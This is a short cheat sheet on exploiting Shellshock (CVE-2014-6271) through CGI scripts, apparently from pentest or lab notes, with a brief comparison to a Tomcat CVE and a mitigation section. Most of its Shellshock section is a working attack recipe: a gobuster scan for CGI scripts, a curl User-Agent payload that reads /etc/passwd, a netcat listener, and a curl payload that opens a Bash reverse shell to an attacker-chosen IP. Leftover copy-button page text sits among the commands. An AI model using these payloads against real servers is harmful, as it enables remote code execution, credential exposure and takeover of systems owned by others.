**Shellshock (CVE-2014-6271 and related CVEs)**

- **Affected Software:** This is a vulnerability in the **GNU Bash shell**
### **In Summary:**

|                         |                                                                                  |                                                                                                                                                          |
| ----------------------- | -------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Feature                 | Tomcat RCE (CVE-2019-0232)                                                       | Shellshock (CVE-2014-6271)                                                                                                                               |
| **Vulnerable Software** | Apache Tomcat                                                                    | GNU Bash shell                                                                                                                                           |
| **Operating System**    | Windows only                                                                     | Linux and Unix-like systems                                                                                                                              |
| **Core Problem**        | Improper handling of command-line arguments by Tomcat's CGI Servlet and the JRE. | Incorrect parsing of functions within environment variables by Bash.                                                                                     |
| **Exploitation Method** | Injecting OS commands directly into the URL parameters of a CGI script request.  | Placing a malicious function definition in an HTTP header (or other vector) that gets passed as an environment variable to a CGI script running on Bash. |
### **2. Shellshock via CGI Scripts (CVE-2014-6271)**

The Shellshock vulnerability affects older versions of Bash. It allows an attacker to execute arbitrary commands by crafting a malicious function definition within an environment variable, which is then passed to a CGI script.

#### **Impact / What Can Be Achieved**

- **Remote Code Execution (RCE):** An attacker can run commands with the permissions of the web server user.
    
- **Reverse Shell:** This often leads to gaining a reverse shell, providing interactive access to the server.
    
- **Further Network Pivoting:** The compromised host can be used as a staging point to attack other internal network resources.
    

#### **Quick Steps / Summary**

1. **Enumerate CGI Scripts:**
    
    - Use tools like gobuster to find CGI scripts (e.g., files with a .cgi extension).
        
        
`gobuster dir -u http://<TARGET_IP>/cgi-bin/ -w /path/to/wordlist.txt -x cgi`
          
        
2. **Confirm the Vulnerability:**
        
    - Use curl to send a crafted User-Agent string to a discovered CGI script. The payload () { :; }; is the key to triggering the vulnerability.
        
    - Attempt to execute a simple command like echo or cat /etc/passwd.
        
`curl -H 'User-Agent: () { :; }; echo; /bin/cat /etc/passwd' http://<TARGET_IP>/cgi-bin/script.cgi`
          
        
- A vulnerable system will execute the command and return its output in the HTTP response.
        
3. **Exploitation to Reverse Shell:**
    
    - **Set up a listener:** On your attacker machine, start a netcat listener on your chosen port.
        
        
`sudo nc -lvnp <LISTENER_PORT>`
          
        
- **Send the reverse shell payload:** Craft a curl request with a Bash reverse shell payload in the User-Agent header.
        
        code Shell
        
        downloadcontent_copy
        
        expand_less
        
            `curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/<YOUR_IP>/<LISTENER_PORT> 0>&1' http://<TARGET_IP>/cgi-bin/script.cgi`
          
        
    - You should receive a connection back on your netcat listener.
        

---

### **Mitigation**

- **CVE-2019-0232:** Update to a patched version of Apache Tomcat.
    
- **Shellshock:** Upgrade the Bash version on the server. If upgrading is not possible, consider network segmentation or decommissioning the affected host.